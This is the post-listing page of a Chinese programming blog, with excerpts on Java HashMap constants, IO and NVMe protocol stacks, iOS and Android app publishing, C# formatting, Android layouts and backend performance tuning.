<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9ecd83e530c6552a45f09bb7e99296e/" rel="bookmark">
			使用Application Loader 3.0 上传ios手机应用安装文件一般步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 登陆application loader。
2. 选择”交付您的应用程序”，点击 “选取”。
3. 选择需要上传的应用安装文件。
4. 确认应用详细信息。确认无误点击下一步.
5. 工具会对安装包进行检查。
6. 如果检查有问题的话，会显示问题列表,可以根据具体问题查找具体解决方案。
7. 如果没有问题，直接点击下一步.
8. 点击完成。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0ae24cf261e181ac2110963258a0777/" rel="bookmark">
			HashMap源码注解 之 常量定义（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意 ，本文基于JDK 1.8 1.默认容量
/** * The default initial capacity - MUST be a power of two. */ static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16 默认初始化的容量为16，必须是2的幂。 2.最大容量
/** * The maximum capacity, used if a higher value is implicitly specified * by either of the constructors with arguments. * MUST be a power of two &lt;= 1&lt;&lt;30. */ static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30; 最大容量是2^30 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0ae24cf261e181ac2110963258a0777/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06379976a0bedff3f19d394206822a34/" rel="bookmark">
			IO协议栈前沿技术研究动态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先上一道开胃小菜，大家知道这是什么东西吗？我估计可能没有人见过，我也没有见过。这个东西是一圈一圈的铁丝，说白是铁丝，当然不是一般的铁丝，是经过设计的。
这是半个世纪前的一种存储装置，是怎么存的呢？跟我在这个房间里面讲话有回声，我说出一句话，声波反射到我耳朵里面，我听到，再把这个话再说出去，它又反射回来。我用这种方式，让我要传达的信息，不断在这个媒介上，空气的振动，不断的振动，循环的振动，这个信息就保存在这儿了，除非我断电。这个装置跟这个原理是一样的。你把一个你要存储的信息，编码成也是一种声波，从这个铁丝上传过去，声波在铁丝里面绕绕绕，绕回来以后，你在这儿再把它重新加强，再发出去，不断的循环。这改变所谓的延迟线存储器。一般延迟五微秒左右。
下面我们进入正题。我今天这个话题就是想为大家分享一下IO协议栈里面一些前沿技术和动态。首先搞清楚什么叫协议，什么叫做栈，什么叫IO。IO协议栈是一个操作系统里面一系列软件的模块，让你的应用要读盘的时候，比如读一个U盘，U盘插上以后，点一个复制粘贴，复制粘贴是一个程序，并不是某个菜单，你点的这个菜单，激发了这么一个进程，后面起了一个进程，比如Linux下的做运维的都知道有一个dd的程序，这个程序会调用系统提供的一些代码。当然先得打开，然后做一个准备工作，然后才读写。这些代码都是OS提供的，你只需要调用就可以了。这些代码会被映射到用户空间里面。你把IO下发给这些代码以后，你把这些参数传给他，要读写哪个文件，哪个路径，哪个设备，怎么度，怎么写？把所有的参数告诉它。
它下一步实现一个操作叫陷入内核，中断到内核里面，这一步操作开始非常大，因为牵涉到权限的转换，开销是很大的。进入内核以后，先到一个VFS的层，这是一大块的代码，这个层就是目录层，比如C：/，Linux下/某个字母，再写一些字母。谁来维护目录和底层的存储的实体的映射关系呢？由VFS层维护，你访问的是一个网络盘的路径，还是一个本地盘的路径，是一个文件，串口，终端，其实都是符号，由VFS把IO下发给底下对应的承载者，底下画了四个承载者。还有跨设备的各种设备，还有网络的系统，还有内存里面的数据结构，比如/PROC，有一些运维的时候用的一些命令，把它从零改成一，触发了某一个逻辑，这都是内存里面的数据结构，也在这个符合下限。
这层再往下，如果访问块设备，直接下到块层，块层是最终对存储设备的集中访问点，在这个层里面，有一些附加功能，比如多路径，加密这种分层，缓存，很多的开源的这些产品，其实都是基本上在块层这个功能上面做二次开发做出来的。块层下面就是一个IO的队列，在这儿做一下IO的优化，合并，存盘这些事情。在这儿会有一个瓶颈，就是IO这个里头的队列是一个瓶颈，上层把IO往这个队列里面放，下层不断把IO拿走。俗话说的SCSI协议栈，包括三层，一个是上层的协议驱动，指磁盘驱动，磁带驱动，如果有其他的设备，比如打印机之类的，SCSI打印机和扫描仪也有，很早的时候，这块就是驱动设备了。SCSI Middle 层就是管SCSI指令，下发下来都是在内存里的数据结构，每个OS都不一样，但是如果发到磁盘，发到外面的交换机，必须把它弄成标准化的，因为外面有很多厂商做硬件，你不标准，就没法做了这个硬件，你不能说为每个OS都做一个硬件。这层除了翻译成SCSI指令，这边有SCSI语义，还有管真正的SCSI的处理，比如超时了怎么办这些事情，这是中间层。
底下这层是HBA层，首先要有驱动，在HBA上有设备发现的这么一层库，因为传统的SCSI几十年前，那时候只有SCSI这么一种物理硬件，大家可能有人见过，很粗很笨的线缆，后来出现了FC，SAS这些，更快速的、高效的物理链路类型。SCSI协议，如果想跑在这些物理链路类型说，就需要有这么一块代码，这个网络里面，把你对端的SCSI设备发现上来，如果后端改成SAS，这块代码就会往SAS网络上发出一些广播的消息，将设备探测到，然后才生成设备符号。
再往下就是硬件，出了协议就是硬件，硬件你先得连到HBA上，SCSI卡、SAS卡、以太网卡、各种卡，通过这个卡，再通过网络，或者连交换机，或者直连，连到最终的设备上。所以，我这儿画了一些箭头，指的是什么呢？每一种硬件，每一个角色都有各自的驱动。最底层的设备，它的驱动在最上面，再往上一层，HBA驱动在这个地方，然后HBA上还有一个PCIE控制器，它是从里向外扩散的一个东西。但是，IO要先发给最上面的驱动，先冲着最底下的设备来，驱动是从上往下这么发出去。这是传统的协议栈。
红色的这块，就是所谓NVMe的协议栈。刚才英特尔也讲过，NVMe跟PCIe有什么区别呢？NVMe它是一个协议栈，是一个协议。跟说话一样，我跟你说话，我们中文这就是比方说SCSI，非常博大精深了，语法，还有成语，非常厚重。NVMe相当于英文，简单直接26个字母。但是，我们都是用嗓子来说话，都是用空气来传播，振动来传播。就是这个道理。SCSI也可以跑在PCIe上，就像SCSI跑在FC上一样，同理NVMe也可以跑到以太网上，也可以跑到FC上，你怎么over都行，over在串口上都行，只要不嫌慢。下面再介绍NVMe这边的协议栈。这个协议栈非常轻量级，像英文一样，表达简单，所以它的速度要快。
我们看看这个传统协议栈到底出了什么问题？为什么这么多人在尝试修改它？主要问题就在于闪存。它没出现之前，没有任何问题，它一出现，全是问题。我们看到底有哪些问题？第一个问题，太长，大家可以看到，我刚才讲的这一堆的东西，其实整个就是IO协议栈。当然，SCSI协议栈是泛式的，一般指下面这块，但是上面这块也应该算。它经历了多少个块？非常多的模块，你每经历一个模块，你这个代码就要在CPU内存之间交换、执行一会儿，还牵涉到来回切换。当然，你拿人的标准来判断，CPU执行的这一条IO可能费不了多长时间，比如微秒、毫秒级。但是，对于SSD，SSD响应非常快，如果上面太慢，你这个性能就发挥不出来。我们常说NVMe SSD性能很高，你是把它放到机箱里面性能很高，但是假设把一块NVMe SSD放到海南去，从北京发一个IO协议到海南，然后它返回，它肯定不会快了。也就是这个IO发出来，到磁盘被收到之间，经历的路径越长，这个时延就越大，经历的模块越多，每个模块处理的事情越多，时延越大。那就是说NVMe离远了，它就不快了。就因为这个时延太高。下面还有另外一个是吞吐量，到时候再说。
太重，所谓太重，每一层都有自己的处理逻辑在里面，比如下到VFS，要搜一下这个目录到底对应的谁？搜fstab表，要是访问文件系统，还得到文件系统把元数据读出来，也就是读元数据的时候，文件系统就会往磁盘上发IO，读上元数据，找到处理你这个IO必要的信息，然后IO才能下到盘，相当于一个IO触发了N个IO，有可能很慢，很重。Block层有很多协议要处理，SCSI协议栈更厚了，因为SCSI传统的东西，发展到现在几十年了，里面什么东西都往里加，各种库，各种不定都往里塞，塞的整个协议栈很重。再往下就是黑盒，到外面外面的设备怎么实现的，你也不知道，有可能就是一块盘，也可能是被别人虚拟出来的盘，也有可能是分布式的，像刚才讲的那种，也有可能是集中式的，你也不知道。但是，你可以猜到什么？下面的存储设备，其实它内部也是个OS，你的IO到他那儿，他也要经历这层，最后才下到真正的物理盘，可能经历N轮，IO才能下去，所以传统协议栈又长又重。
还有一个窄的问题，就是Block层的队列只有一个。这个队列就是IO不断的往里堆，你有多个应用访问底下的设备，多个应用都是多盒CPU，每个CPU运行一个线程，每运行一个线程都往下发IO，如果正好四个线程都往里发IO，相当于一个单车道，两辆车同时往里塞，就会出现撞车，IO也是一样的。谁要往这里面发IO，要更新写指针，如果这个变量是双字节，或者四字节，你写一个字节，我写一个字节，最后写乱了，就崩溃了，乱套了。所以，你要往里插入IO，必须把这个队列锁住，又把这个变量锁住，先加锁，加锁别人就不能访问了，然后你再往里写。这样顶上看似是并行的，到这儿就变穿行了，再这么搞一个加锁，就开销非常大了，所以导致性能比较差。当然，对于机械硬盘，都不是问题，因为机械硬盘太慢了，这点开销对它来讲，根本就不算开销。这是窄，就一个队列。
我们再看看浅。这个队列不但就一个队列，还窄，而且还浅，里面容纳不了多少IO，SATA最大32，SAS盘最大256，上去还有HBA卡的队列，驱动里面的队列，Block里的队列，这些队列都是照着这个盘设计的，比如256个盘，256×32，最大照着那个来，但是实际比这个还要少。浅会造成什么问题？如果底下很慢，浅没有问题，因为一时半会儿消耗不完这也IO。但是，如果很快，会发现一会儿这个队列就空了，一会儿IO还没有下来，又空了，整个这个跟开车一样，油给不上，就是这个道理，太浅了。
“长+重=厚”。比如传统说的协议栈很厚，就指这个意思，又长又重。厚影响时延，刚才那个例子。什么场景下在乎这个时延呢？比如OLTP，用什么场景呢？就是在线处理。这个场景就相当于你在淘宝里买了东西，点个购买，你恨不得马上我就成功，点个付款，马上成功，你总有人等着你，马上回来。这就是证明有人在等，赶快回来。如果点击购买，发给谁，半天才回来，你肯定不再在网上买东西了，因为三天两头超时你就会很不爽，所以时延很重要。
同步IO是典型的要求时延的场景，你发一遍IO以后，IO结果返回了，才发下一个IO。我IO调用下去以后，阻塞掉了，你不返回，我的代码就没法往下走，又被阻塞掉了。如果是同步IO，这个路又非常长，性能就非常差，但是，如果是异步IO，你流程长，我时延大没有关系，但是吞吐量还是可以上来的。因为我原端不断把IO往下发，IO不断的过去，你不断的接收，总体是有一个时延的，这个就看场景了。OLTP很在乎时延，对吞吐量要求不那么高。
窄和浅就影响吞吐量，因为本来并发的变成串行了，一个一个来，最后吞吐量就上不去，OLAP场景最怕吞吐量低，比如大数据分析，因为没有人等着你马上把结果返回来，你这个任务下发下去，要分析谁谁谁，某处买个什么东西，哪个时间段干什么事，这就是定型的OLAP场景，不是点一个按纽，马上就知道结果的，可以等一分钟，这一分钟以内，你只要保证底层的吞吐量最大，完成的速度就快，它对时延反而没有什么要求。
我们看看传统IO协议栈问题很严重，对于机械盘来讲，是没有问题的，你算算就可以了。协议栈引入比如0.01毫秒的时延，一个IO下去，一直到发给磁盘，出了这台机器，耗了0.01毫秒，别看这么大的带宽执行。机械盘执行这个IO，平均需要10毫秒，这么一比，开销就这么点，根本没有问题。但是，对于它就有问题了。SSD执行平均耗费比如10微秒，基本50%的开销了。所以，这个IO下去一半的时间在路上，一半的时间执行，这个效率非常差。所以，要着手去优化这个协议栈。
NVMe协议栈是怎么优化的呢？就是把长、重、窄、浅取个反义词就完了。长就降低模块的数量，它从块层，把IO Scheduler下面一堆的东西全部格掉了，不再修改，从Block下来。设备发现一堆的库，这个不需要，如果是NVMe Over PCIe，它的设备发现都是PCIe给它做了，他自己不需要做，就变轻了。只有一组指令，很少的指令数量。关键是下面这两个，队列变宽了，之前只有一个队列，相当于只有一个单缸的发动机，如果来一个多缸发动机，动力当然强了，所以变宽。还有变深，每一个队列很深，这个汽缸排量就这么一点，坡都爬不上去，换个大的，一次让它玩命的爆炸，NVMe基本就这么干的。
变短、轻、宽、深了以后，基本就是这么一个情况。SCSI协议栈就这么一个队列，硬件队列，硬件队列，块层队列，块层最大支持64K的队列，当然现实产品没有用这么多的，但是将来不一定多，将来谁知道会发展成什么样呢。对传统的SATA SSD、SAS SSD，他们走的是SCSI协议栈及不是NVMe，他们只是SCSI指令，这个怎么优化？他们也是SSD。所以，最新版本内核，做了块层的多队列优化。底层驱动跟着多队列，这样就把它变宽的，当然这是在最新的内核下面才有这个特性。
NVMe1.2版本里面有一个特性叫Controller Memory Buffer。传统的驱动模式是，先把命令准备好，在内核内存里面，然后由驱动去通知这个设备，我这儿有条命令，设备要自己到内存里面，把这个命令取回来，设备要自己来取，你看这里面，很麻烦，我不是把说命令直接扔给你了，你自己来取，我告诉你这条命令。那么，为什么这么设计呢？我也不清楚。但是，现在有了这个SSD以后，有了这条命令以后，直接把这个命令写到设备里的内存了，少了一轮交互，当然NVMe1.2现在还没有能支持，很快了，无非就是软件上，当然硬件上也会有一些改动，当然改动也不是非常大。
驱动方面，早期的IO设备有一种模式，叫做Program IO，PIO，这个PIO是什么意思？很早的时候，比如打印机，把打印命令发出去以后，打印完没有，这个程序要不断的问这个设备，打印完了没有？不断的问，如果全速循环的问，CPU百分之百就耗进去了，所以每次执行都耗干净了，不断发N个指令问这个设备，打印完了没有，这很浪费的，CPU都干这个事了。因为这个打印机很慢。后来才出现中断方式，我这个打印机打印完以后，你命令下给我以后，你该干什么干什么，打印完了，我给你发个中断信号，你把你当前正在执行的程序保存起来，上下文保存起来，然后来处理我这个IO完成命令。这个就非常好了，又不耽误事，CPU又不会耗费这么高。
这个模式一直发展到今天，终于出了问题了。当然也不是问题，只是效率显得低了。为什么？现在不是说SSD慢了，不是说CPU在等SSD完成IO指令了，是IO指令下去以后，SSD等待你CPU来处理这些IO的完成。我下面快了，怎么办？CPU就得回归到传统的模式。下面这么快，我就不断的问，每次问的时候，肯定会有完成的，因为底下太快了。每个io完成之后是在一个完成队列里面等着，告诉上层IO我完成了。
所以，就有人在开发这种叫PMD，polling mode driver。中断模式的驱动其实还有一个致命的伤，对SSD有一个致命伤，就是中断IO完成模式，SSD收到指令完成，这个过程基本在8.5-9微秒之间完成。这是一个叫PDF的分布图，大部分的IO都集中在这个横坐标的时延，集中在这个区域完成。它完成以后要发中断，中断完了，CPU驱动处理。处理的时候，大家可以看到，99%点几都在5毫秒之内就完成了，但是百分之零点几的概率会在30微秒才完成，产生了一个叫长尾效应的这么一个效应。30微秒，一旦IO正好到这儿，30微秒才结束，这体现SSD的性能抖动，延时抖动，这个抖动会造成什么？比如高速路上突然有一个车停在车道上，后面的车就得绕过他，一变道，那个车又减速了，整个就堵在那儿了，就算不停下来，速度慢了点都会出现这个问题。SSD这么高的速度，上面使劲发IO，这么大的吞吐量，突然来这么一下，整个性能反馈上去，就会出现比较严重的后果，可能上层业务就卡在那儿了。这是刚才那个道理，高速路。这也是一个严重的问题，就是中断模式。
所以，有人在研发Poldling额 Mode Driver，说白了就是用驱动不断的Poll这个完成队列，把IO赶紧拿出去，赶紧处理掉。其实代码上也比较简单，就是这三大块poll，然后锁住队列，执行一条IO，解锁。单个队列还得锁，多个队列之间就不用锁了，多个队列之间是毫无关系的。这个付出的代价就是CPU又达到百分之百，因为要不断的polling，不断的循环，你把CPU占满就体现为百分之百。
我们看一下实际的测试效果。先看一下两种方式，一个是在内核里面poll。一个是在用户态poll。这个用户态是比内核态更高效的驱动，因为每次IO下去都要进内核，陷入内核，开销非常大，直接用户态Poll，这个性能更高，但是如果在用户态做个驱动，优势就是性能会有比如10%的提升。但是享受不到操作系统的任何功能。所以你的用户态自己开发的程序，自己做一个。一般人不敢玩这个，玩不好，反而还不如之前的性能。
这是一个人做的测试，基本上三种模式，一个是传统的中断模式，这个是在内核态poll的模式，还有这个用户态poll模式。同样的方式，QD=1的时候，它的性能能到68000IOPS。换成轮询模式性能达到10800。换成用户态poll，需要自己在用户态写一些服务，用它来做，120K，12万，基本是中断模式的两倍了，所以这个效果提升非常明显，但是CPU的耗费也是上来了，基本都是百分之百。时延当然轻了，传统模式12微秒。
这就是SPDK，它由好几部分组成，如果跑以太网，把DPDK也包进去了，其实都是在用户态运行的，绿色是你自己开发的的，三个蓝色就是用户态的NVMe驱动，包括Mcm Drive。这就是今天分享的东西，当然这块还有很多东西要说，这些后续有机会再和大家分享。谢谢大家！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/477e819aba1e25af01a0ba87480b533f/" rel="bookmark">
			appstore上架一般操作流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 创建属于自己的AppleID。打开网站https://appleid.apple.com/cn，选择“创建您的Apple ID”,填写相关的信息，点击继续。
2. 进行邮箱验证。上一步完成后，服务器会向注册的邮箱发送一个验证码，将验证码填入相关位置即可。
3. 提交审核前需要准备一下资料：
1.app截图4-5张，4种尺寸（640*960，640*1136，750*1334，1242*2208）
2.mac电脑，并且已经安装Application loader3.0或以上版本。
4. 登录iTunes Connect，网址：https://itunesconnect.apple.com/itc/static/login?view=1&amp;path=%2FWebObjects%2FiTunesConnect.woa%2Fra%2Fng%2Fapp%3F。
5. 点击我的App。
6. 点击需要提交上架的应用，填写相关信息。
7. 填写相关信息，可以点击’？’查看相关要求。
8. 填写完毕后点击”存储”.
9. 使用Application loader上传ipa安装文件。
10. 重新登录iTunes Connect，选择需要上架的应用，在构建版本中选择已经上传的版本。
14.点击”存储”旁边的”提交审核”.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cca0d7328ed21a73615b0f1af72371f1/" rel="bookmark">
			C#中将数据的格式显示为千分位显示格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 double test = 123456.123; Console.WriteLine(test.ToString("###,###.000")); //结果：123,456.123 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/310fe1db460027592c4c8e8429da71cf/" rel="bookmark">
			HDU-1437(天气情况)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HDU-1437(天气情况)
天气情况 Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 65536/32768 K (Java/Others)
Total Submission(s): 717 Accepted Submission(s): 294
Problem Description 如果我们把天气分为雨天，阴天和晴天3种，在给定各种天气之间转换的概率，例如雨天转换成雨天，阴天和晴天的概率分别为0.4,0.3,0.3.那么在雨天后的第二天出现雨天,阴天和晴天的概率分别为0.4,0.3,0.3.现在给你今天的天气情况,问你n天后的某种天气出现的概率. Input 我们这里假设1,2,3分别代表3种天气情况,Pij表示从i天气转换到j天气的概率. 首先是一个数字T表示数据的组数. 每组数据以9个数开始分别是P11,P12,P13,……,P32,P33,接着下一行是一个数字m，表示提问的次数。每次提问有3个数据，i,j,n,表示过了n天从i天气情况到j天气情况(1&lt;=i,j&lt;=3 1&lt;=n&lt;=1000)。 Output 根据每次提问输出相应的概率(保留3位小数)。 Sample Input 1 0.4 0.3 0.3 0.2 0.5 0.3 0.1 0.3 0.6 3 1 1 1 2 3 1 1 1 2 Sample Output 0.400 0.300 0.250 刚开始想用dfs写，可是由于1&lt;=n&lt;=1000，会超时。所以不得不想别的方法。 因为最近刚看了lcs，所以受lcs思想影响，用dp[ ]数组记录从某种天气经过t天到这3种天气情况发生的概率。dp[1]，表示从某种天气经过t天（t不确定）到1这种天气的概率，同理dp[2]，表示从某种天气经过t天（t不确定）到2这种天气的概率，dp[3],表示从某种天气经过t天（t不确定）到3这种天气的概率。
通过for循环，随着经过天数的改变，不断更新到这3种天气的概率。更新到最后就可以得到最终结果。
以dp[1]=t1[1]*map[1][1]+t1[2]*map[2][1]+t1[3]*map[3][1];为例 ,
t1[1]*map[1][1]表示前一天的天气是第1种而当前天的天气也是第1种天气的概率，其中t1[1]，表示前一天是第1种天气的概率; t1[2]*map[2][1] 表示前一天的天气是第2种而当前天的天气是第1种天气的概率，其中t1[2]，表示前一天是第2种天气的概率; My solution：
/*2016.3.31*/
&lt;pre name="code" class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/310fe1db460027592c4c8e8429da71cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def4a056c50a16b45688427b94803d06/" rel="bookmark">
			文件服务器与web服务器分离的的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文件服务器：文件的上传与下载等单独放在一个服务器上处理
要实现的功能是：在一台网络服务器上启动了tomcat服务器，运行一个很大的网站，用户可以登录网站，然后上传文件和照片等，由于担心硬盘空间的问题，希望用户上传的文件等，能够上传并保存到另一台机器上，同时用户登录后又可以实时查看到自己之前上传的文件，并且需要保证文件和照片安全性。
在iteye 上看到有人说“.把两台机器赋予不同的domain name,比如主机是 www.mysolution.cn, 文件服务器是photo.mysolution.cn,负责图片上传的servlet被部署在photo.mysolution.cn这台机器上,并存储图片的同时把图片的url比如http://photo.mysolution.cn/raylinn/2342S/23235da234.jpg, 写回www.mysolution.cn的数据库中” 先说磁盘映射吧，这个一般是针对widows主机 比如现在有A、B两台服务器，A跑应用，B存储，现在将B的磁盘映射到A上面，成为X盘，这时X盘就相当于A的一个磁盘，存取文件的时候和本地磁盘上的是一样的。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaff695fb7b87c19f89d13c920ef8ae1/" rel="bookmark">
			Android应用一般上架流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android App上架所需文件 上架准备 App文件：
1. 安装包
2. 应用商标：图片格式PNG，大小512*512，小于800KB。
3. 应用截图（4~6张）：图片格式JPG或者PNG，图片大小480*800，且每张大小一致，单张图片不能超过3M。
各应用市场的账号：
1. 个人账号：
身份证号，手持身份证照（正反）
下图是百度开发者中心注册信息：
2. 企业账号：
营业执照号码、公司纳税登记号、注册地址、上传营业执照、法人姓名、法人身份证号码。
下图是360企业开发者注册信息:
企业帐号和个人帐号区别：
1. 企业帐号可以申请认证，认证通过后app会显示官方认证标识。
2．部分应用市场只允许企业帐号发布app应用如华为开发者联盟。
上架操作 1. 首先登录开发者平台地址，进行登录（这里需要先申请开发者账号，提交基本开发者信息，具体参照市场注册说明）如下图所示：
注：可在百度中搜索:XX开发者中心、XX开放平台。
2．登录后，进入管理中心，如果之前已经上传了应用的话，会在下面显示已有应用的信息。如下图所示：
3.进入管理中心后，点击创建软件选择软件。如下图所示:
4． 上传apk安装文件，完善应用描述信息及上传图标和截图。
5.提交后，等待审核。（具体审核时间有个应用市场进度决定，目前最快的应该是360，大约1个工作日能够完成）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e323f9850a67709c525bab1c082048a0/" rel="bookmark">
			Avoid non-default constructors in fragments的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在使用Android Studio打包的时候遇到了一个错误，错误的提示信息是这样子的：
“Avoid non-default constructors in fragments: use a default constructor plus Fragment#setArguments(Bundle) instead” 很显然Google想让我们使用默认的构造函数，而不要去使用重构的构造函数。其实当时正确的解决办法应该是使用setArguments传递参数，然后在Fragment里使用getArguments获取参数。但是由于改动代码不知道会比较麻烦，所以可以在类的前面加上@SuppressLint(“ValidFragment”)。这样就不会提示错误了。当然这只是权宜之计，我们最好还是要在有空的时候改动原来的代码。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b03407ac70307726bb0d518d12ecd91a/" rel="bookmark">
			朋友圈动态性能优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、项目背景 用户动态存储在mongodb中。
动态按用户可见性分为三种类型
公开动态：所有好友可见私有动态：仅自己可见半公开动态：指定好友可见 用户刷新朋友圈需查询出以上三种类型的动态，以及自己发布的动态，按自增ID（和发布时间正相关）倒序排列，并分页显示。
后端有一台mongodb服务器提供查询服务，访问量较大时，服务器负载很高，查询速度很慢，出现较多慢查询，甚至查询超时。
二、性能优化 2.1 优化目标 减轻mongodb服务器压力提高查询速度 2.2 优化方案 维护用户可见的动态队列化复杂查询为简单查询（利用主键索引） 2.3 技术细节 用户动态队列存储在redis有序集合中，集合中存储动态ID，队列最大长度做了限制查询时先从用户动态队列取动态ID，如果数据量足够，直接做一个in查询，否则做一次复杂查询以补全数据 2.4 队列的初始化 从mongodb查出用户可见的动态ID，放入用户动态队列
2.5 队列的更新 用户做以下操作时，需更新动态队列
用户登录：初始化用户队列，每个用户只做一次初始化（异步）发布动态 | 删除动态：更新自己的队列（同步）；更新好友的队列（异步）添加好友 | 删除好友：更新自己的队列（异步）；更新好友的队列（异步）打开朋友圈 | 关闭朋友圈：更新好友的队列（异步） 实现细节
用户做以上操作时记录用户操作事件（观察者模式）。事件存储在mysql中。服务器启动定时任务处理用户事件。根据不同事件类型、业务需要、事件处理复杂度等因素灵活调整定时任务的运行频率以及每个定时任务处理的事件数量。多进程并发场景：事件开始处理前将状态置为“正在处理”，防止有多个进程重复处理同一个用户事件。事件处理失败后重试，并设置最大重试次数，对处理失败且超过最大重试次数的事件做预警。 三、优化效果 redis缓存380000用户动态队列，占用内存1.2Gmongodb服务器8核CPU，访问量高峰期的CPU负载从799%降至303%，服务器负载（load值）峰值维持在3~5之间。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e49bdab58b087489edd8ae9dccfb53a1/" rel="bookmark">
			activiti:initiator的作用及其使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：http://www.kafeitu.me/activiti/2012/09/14/activiti-initiator.html?utm_source=tuicool&amp;utm_medium=referral
1.场景模拟 以kft-activiti-demo中的请假流程为例，操作流程：
用户A申请请假领导B驳回任务流转到“调整请假信息”节点 问题来了：如何把“调整请假信息”任务自动分配给申请请假的用户A呢？
2.救世主activiti:initiator Activiti为此专门在startEvent上扩展了一个属性activiti:initiator用了解决这个问题。
下面的代码片段包含了这个属性：
? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt; process id = "leave" name = "请假流程" &gt; &lt; startevent id = "startevent1" name = "Start" activiti:initiator = "applyUserId" &gt;&lt;/ startevent &gt; &lt; usertask id = "deptLeaderAudit" name = "部门领导审批" activiti:candidategroups = "deptLeader" &gt;&lt;/ usertask &gt; &lt; exclusivegateway id = "exclusivegateway5" name = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e49bdab58b087489edd8ae9dccfb53a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1099a80dc17cda3a3fcbc64a648cf4a/" rel="bookmark">
			android 仿 微信带尖角的popwindow
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最后的结果就是上图的样式，
首先要有个上图的背景图，其他就很简单。
下面是代码
首先pop的布局
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="wrap_content" android:layout_height="wrap_content" android:background="@drawable/menu_down" android:orientation="vertical" &gt; &lt;RelativeLayout android:layout_width="wrap_content" android:layout_height="30dp" android:id="@+id/layout_station" android:layout_marginTop="10dp" android:padding="5dp"&gt; &lt;ImageView android:layout_width="15dp" android:layout_height="15dp" android:layout_marginLeft="7dp" android:scaleType="fitCenter" android:layout_centerVertical="true" android:background="@drawable/find_serve_white" android:id="@+id/imageView29"/&gt; &lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:textColor="@color/white" android:textSize="14dp" android:layout_marginLeft="5dp" android:layout_centerVertical="true" android:text="服务站点" android:layout_alignBottom="@+id/imageView29" android:layout_toRightOf="@+id/imageView29" /&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:layout_width="fill_parent" android:layout_height="30dp" android:id="@+id/layout_drug" android:orientation="horizontal" android:padding="5dp"&gt; &lt;ImageView android:layout_width="15dp" android:layout_height="15dp" android:scaleType="fitCenter" android:background="@drawable/find_drug_drug" android:id="@+id/imageView30" android:layout_marginLeft="7dp" android:layout_centerVertical="true" android:layout_alignParentTop="true" android:layout_alignParentLeft="true" android:layout_alignParentStart="true" android:layout_marginStart="16dp"/&gt; &lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:textColor="@color/white" 